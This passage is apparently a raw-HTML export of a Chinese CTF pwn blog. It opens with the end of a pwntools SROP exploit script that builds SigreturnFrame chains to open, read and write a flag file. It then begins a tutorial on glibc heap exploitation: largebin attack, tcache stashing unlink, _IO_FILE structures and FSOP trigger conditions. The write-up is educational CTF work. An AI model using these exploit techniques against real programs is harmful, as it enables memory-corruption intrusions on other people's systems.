class="line">p.recv()</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0x38</span> +p64(pop_rdi)+p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span class="number">0</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x1000</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x10</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">2</span></span><br><span class="line">sig.rsi = buf</span><br><span class="line">sig.rdx = <span class="number">0</span></span><br><span class="line">sig.rcx = <span class="number">0</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x120</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x120</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x120</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x120</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span class="number">3</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x240</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x240</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">1</span></span><br><span class="line">sig.rsi = <span class="number">1</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOFILE exploit</title>
      <link href="/IOFILE-exploit/"/>
      <url>/IOFILE-exploit/</url>
      
        <content type="html"><![CDATA[<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>前段时间给人讲课，碰上了高版本glibc堆利用这部分。刚好自己啥也不会，于是花了些时间好好学了下IOFILE在高版本下的利用。好在最后没有翻车，自己在备课期间也独立完成了一些经典例题，算是有了一些粗浅的收获。现以一个初学者的目光重新梳理学习IOFILE利用的整个过程。</p><h1 id="辅助手法"><a href="#辅助手法" class="headerlink" title="辅助手法"></a>辅助手法</h1><p>IOFILE的利用，通常需要伪造IOFILE结构体，随后通过一些方式触发IO流，使得程序调用我们劫持后的IO函数，从而达成getshell或者orw。所以IOFILE exploit实际上是整个利用环节的<strong>最后一步</strong>，要达成伪造IOFILE结构体、触发IO链，往往需要借助一些<strong>辅助手法</strong>。</p><p>在高版本下，最为常用的是<strong>largebin attack</strong>，该手法需要一个UAF，达成后能在任意目标地址写上堆地址，简单暴力，用过都说好。还有<strong>tcache poisoning</strong>，用来分配到任意地址上。还有一种是<strong>tcache stashing unlink</strong>，该手法在house of pig中被使用，要求程序使用calloc，并存在UAF，通常结合largebin attack达成将目标地址分配为chunk。</p><h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h2><blockquote><p>原先存在两条利用链，其中一条在高版本下已被封禁，查找资料时需甄别。</p></blockquote><p>首先我们需要了解largebin的结构：</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811162248700.png" alt="image-20230811162248700"></p><p>一个large bin中包含<strong>一定范围大小</strong>的large chunk，如第一个largebin大小范围为(0x400-0x430)，第二个为(0x440-0x470)。同一个bin中，相同大小的chunk之间用<code>fd</code>、<code>bk</code>相连，不同大小用<code>fd_nextsize</code>、<code>bk_nextsize</code>相连，且自动由大到小排序，如上图中左边的大于右边。</p><p>当有新的chunk加入largebin，且大小小于该bin中已有的chunk时，会进行如下操作（精简版）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">victim_index = largebin_index (size);</span><br><span class="line"><span class="comment">/*查找该size属于的bin范围，返回index*/</span></span><br><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line"><span class="comment">/*取得bin*/</span></span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//critical1!!!</span></span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//critical2!!!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该操作实际上完成了一个简单的将chunk加入双向链表的过程，可以逐步手动模拟加深理解</p><p>该操作缺失对双向链表完整性的检查，可以加以利用</p><p>我们假设largebin中仅存在chunk0，现在准备将chunk1加入largebin，且chunk0 &gt; chunk1。我们把chunk0的<code>bk_nextsize</code>修改为<code>[target-0x20]</code>(即<code>target</code>目标地址位于以<code>[target-0x20]</code>开头的chunk的<code>fd_nextsize</code>处)</p><p>修改完成后，我们将chunk1入链，重点关注上述代码片段中注释的部分。critical1处 <code>victim-&gt;bk_nextsize = (&amp;target)-4)</code>，critical2处 <code>(&amp;target)-4)-&gt;fd_nextsize = victim</code>，即<code>*target = victim</code>。目标达成</p><p>由此可见，largebin attack的利用相当简单，只需一个UAF即可完</p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>忘写了XD</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><p>glibc加入tcache后，当从smallbin中取出chunk时，如果smallbin中仍有chunk且对应tcache未填满，则会将smallbin中剩余chunk全部依次放入对应tcache中。而在该过程中，只对从smallbin中取出的chunk进行了完整性检查，后续chunk均没有。该手法则利用了这一漏洞。</p><p>以下为将smallbin中chunk放入tcache的代码片段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="comment">//只对第一个chunk进行了完整性检查，后面进入循环，无检查</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">bck = tc_victim-&gt;bk;</span><br><span class="line">...</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"><span class="comment">//将其放入到Tcache中</span></span><br><span class="line">tcache_put (tc_victim, tc_idx);</span><br></pre></td></tr></table></figure><p>假设smallbin中只存在两个chunk，先入的为chunk0，后入的为chunk1，根据smallbin的<strong>FIFO</strong>原则，取出时先取出chunk0</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811170105495.png" alt="image-20230811170105495"></p><p>同时令对应大小的tcache中已填入5个chunk</p><p>此时将chunk1的<code>bk</code>位修改为目标地址<code>target</code>（不破坏<code>fd</code>），并利用其他手法使得<code>[target+0x8]</code>处为一个指向<strong>可写内存</strong>的指针。把<code>target</code>看作一个chunk的用户指针，则<code>[target+0x8]</code>为<code>bk</code>位。此处令其可写是因为进行该攻击时会向该指针指向的地址处写一个值，如果不可写的话程序会报错。用largebin attack将此处覆盖为可写的堆地址是一种常见操作</p><p>此时，我们用<code>calloc</code>函数将chunk0申请出来。<code>calloc</code>具有跳过tcache申请chunk的性质，所以此处只能用<code>calloc</code>。之后chunk1会加入tcache，chunk1的bk指向的<code>target</code>也会加入tcache。如果我们使用<code>malloc</code>，根据tcache <strong>LIFO</strong>的性质，就能将<code>target</code>申请出来。</p><h1 id="IOFILE及相关结构"><a href="#IOFILE及相关结构" class="headerlink" title="IOFILE及相关结构"></a>IOFILE及相关结构</h1><h2 id="IO-FILE-PLUS"><a href="#IO-FILE-PLUS" class="headerlink" title="_IO_FILE_PLUS"></a>_IO_FILE_PLUS</h2><p>程序在进行<strong>IO操作</strong>时，会用到IOFILE相关的结构。例如众所周知的<code>stdin</code>、<code>stdout</code>、<code>stderr</code>，都是指向IO结构体的指针。当打开一个文件时，程序需要记录文件的输入输出缓冲区等内容，于是需要一个<code>_IO_FILE</code>结构体进行记录。除此之外，对文件进行的各种操作形成了一张张函数虚表，文件需要一个指针记录对应的函数虚表，该指针被定义为<code>_IO_jump_t</code>类型。<code>_IO_FILE</code> 结构体和虚表指针<code>_IO_jump_t</code>形成了一个称为<code>_IO_FILE_plus</code>的结构体，它的定义是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>常见的<code>_IO_FILE_plus</code>结构体有<code>_IO_2_1_stderr</code>、<code>_IO_2_1_stdout</code>、<code>_IO_2_1_stdin</code>，前面提到的<code>stdin</code>等就是指向这些对应<code>_IO_FILE_plus</code>结构体的指针</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811172846782.png" alt="image-20230811172846782"></p><p>可以通过gdb的<code>p</code>指令查看</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173045845.png" alt="image-20230811173045845"></p><p>此外，存在一个指向<code>_IO_FILE_plus</code>结构体的<code>_IO_list_all</code>指针，通常情况下指向<code>_IO_2_1_stderr</code></p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173332086.png" alt="image-20230811173332086"></p><p>每个<code>_IO_FILE</code>结构体中都存在一个<code>_chain</code>指针，指向下一个<code>_IO_FILE_plus</code>结构体。通常情况，表示如下：</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173606405.png" alt="image-20230811173606405"></p><p>当有新文件被打开时，对应的<code>_IO_FILE_plus</code>结构体就会被插入到<strong>链首</strong>。</p><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><p>以下是<code>_IO_FILE</code>结构体的源码，看起来可能有些头大，重点需要了解的是几个<strong>缓冲区的指针</strong>、<code>_chain</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The tag name of this struct is _IO_FILE to preserve historic</span></span><br><span class="line"><span class="comment">   C++ mangled names for functions taking FILE* arguments.</span></span><br><span class="line"><span class="comment">   That name should not be used in new code.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE_complete</code>可以理解为<code>_IO_FILE</code>的豪华加长版，其中的<code>_wide_data</code>需要关注一下，有些手法会用到。</p><h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><p><code>vtable</code>是一个指向<code>_IO_jump_t</code>结构体的指针。当打开一个文件时，相应的 <code>_IO_FILE</code> 结构体会被创建，并将其<code> vtable</code> 字段指向对应文件类型的 <code>_IO_jump_t</code> 结构体的地址。这样，当需要执行文件操作时，可以通过 <code>_IO_FILE</code> 结构体中的 <code>vtable</code> 字段获取到相应的 <code>_IO_jump_t</code> 结构体，并通过其中的函数指针调用相应的文件操作函数。</p><p>通常，一个<code>_IO_jump_t</code> 结构体包含以下函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意，程序中存在很多<code>_IO_jump_t</code>结构体，不同的<code>_IO_FILE_plus</code>可能采用不同的<code>_IO_jump_t</code>，例如stdin&#x2F;stdout&#x2F;stderr使用<code>_IO_file_jumps</code>，可以通过gdb查看</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811182023451.png" alt="image-20230811182023451"></p><h1 id="FSOP基础"><a href="#FSOP基础" class="headerlink" title="FSOP基础"></a>FSOP基础</h1><p><strong>FSOP</strong>(File Stream Oriented Programming是针对<code>_IO_FILE</code>结构体与IO操作的攻击方式</p><p>通常可以分为两个步骤：<strong>劫持</strong>并<strong>伪造</strong>IO结构体、<strong>触发</strong>IO流</p><p>因为触发IO流的方式影响程序进入的IO结构体，所以我们先讲如何触发IO流</p><h2 id="触发IO流"><a href="#触发IO流" class="headerlink" title="触发IO流"></a>触发IO流</h2><p>触发IO流的方式主要分为两种：<strong>FSOP</strong>的经典方式和<strong>house of kiwi</strong>的方式</p><h3 id="FSOP-IO-flush-all-lockp"><a href="#FSOP-IO-flush-all-lockp" class="headerlink" title="FSOP - _IO_flush_all_lockp()"></a>FSOP - _IO_flush_all_lockp()</h3><p>该函数的调用有以下三种触发方式：</p><ol><li><code>libc</code>检测到<strong>内存错误</strong>，从而执行<code>abort</code>函数时（在<code>glibc-2.26</code>删除）</li><li>程序执行<code>exit</code>函数</li><li>程序从main函数返回（同样是执行exit）</li></ol><p>可以看到，高版本下，基本的触发方式都是通过<code>exit</code>函数，其栈回溯为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">_IO_cleanup ()</span><br><span class="line">__run_exit_handlers (status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="number">0x1</span>)</span><br><span class="line">__GI_exit (status=&lt;optimized out&gt;)</span><br></pre></td></tr></table></figure><p>就能调用到<code>_IO_flush_all_lockp()</code>函数</p><p>该函数的代码片段如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"> </span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"> </span><br><span class="line">    fp = fp-&gt;_chain; <span class="comment">//遍历链表</span></span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在经历一系列条件判断后，程序会调用虚表中的<code>_IO_OVERFLOW</code> 函数，而虚表指针是可以由我们伪造的。所以合理布局，触发该函数，就能进入我们伪造的执行流。</p><p>下面讲如何达成调用<code>_IO_OVERFLOW</code>函数的条件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>根据短路原则，执行<code>_IO_OVERFLOW</code>需要满足前面的条件为真，这里有一个或语句，故有两种达成条件，满足任一即可：</p><p>1.<br>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p><p>   这是较为常用的达成条件，只需伪造<code>_IO_FILE</code>中的<code>_IO_write_ptr</code>、<code>_IO_write_base</code>和<code>_mode</code>即可达成</p><p>2.<br>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 